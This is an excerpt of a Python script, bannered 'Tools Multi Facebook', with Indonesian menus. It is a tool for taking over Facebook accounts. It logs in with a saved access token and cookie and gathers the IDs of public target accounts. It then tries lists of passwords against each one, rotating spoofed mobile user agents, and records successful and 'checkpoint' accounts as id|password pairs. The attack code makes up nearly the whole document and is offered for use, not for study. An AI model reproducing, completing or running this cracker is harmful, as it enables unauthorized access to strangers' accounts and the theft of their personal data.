...
for xd in range(10000):
	...
	ugen2.append(uaku)
#Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A528B/A528BXXS1AUL3) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36
#Mozilla/5.0 (Linux; Android 8.1.0; Redmi Go) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 
#User_Agent():
	...
	l='Mobile Safari/537.36 VivoBrowser/9.3.0.1'
...
("     _   ")|"  \    /"  | /"     "| 
 )__/  \\__/  \    \  //   |(: ______)      Tools Multi
    \\_ /     /\\    \/.    | \/    |          Facebook
    |.  |    |: \.        | // ___)   
    \:  |    |.  \    /:  |(:  (         
     \__|    |___|\__/|___| \__/    [bold magenta]By: Lupine-Id With Syarif-XD
...
def login():
	try:
		...
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name,birthday,email&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			sy4 = json.loads(sy.text)['birthday']
			sy5 = json.loads(sy.text)['email']
			menu(sy2,sy3,sy4,sy5)
		except KeyError:
			login_lagi334()
...
def login_lagi334():
	try:
		...
		print("[1].LOGIN LEWAT TOKEN")
		print("[2].LOGIN LEWAT COKIE")
		x = input("PILIH : ")
		if x in ["1"]:
		...
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(name,id,birthday,email):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	...
	os.system('clear')
	banner()
	cetak(nel('[1]. CRACK PUBLICK           [5].HASIL CRACK              [0]. KELUAR ',title='[bold green]MENU CRACK'))
...
def dump_massal():
	try:
		...
		exit()
	try:
		cetak(nel(f'\t \tPilih Berapa Target Yg Kalian Ingin Crack',title='[bold green]ID MASSAL'))
	...
	for met in range(jum):
		#yz+=1
		cetak(nel(f'\t \tMasukan Id Target Yg Publik Bukan Yg Privat',title='[bold green]ID'))
		kl = input('╭──( MASUKAN ID YANG KE 1 )  \n╰─> : ')
		uid.append(kl)
	for userr in uid:
		try:
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel(f'[1].CRACK AKUN OLD        [2].CRACK AKUN NEW    \t[3].CRACK RANDOM ',title='[bold green]MENU PILIHAN'))
	hu = input('╭──( Pilih )\n╰─> : ')
	if hu in ['1','01']:
...
def crack(idf,pwv):
	...
	prog.advance(des)
	ua = random.choice([
	"Mozilla/5.0 (Linux; Android 9; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 11; BV6600E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 12; SM-A125U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 12; CPH2211) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:79.41.199.180]"
	])
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				akun.append(idf+'|'+pw)
				tree= Tree(f" ")
				tree.add(f"\r[bold yellow]{idf} | {pw}")
				cetak(tree)
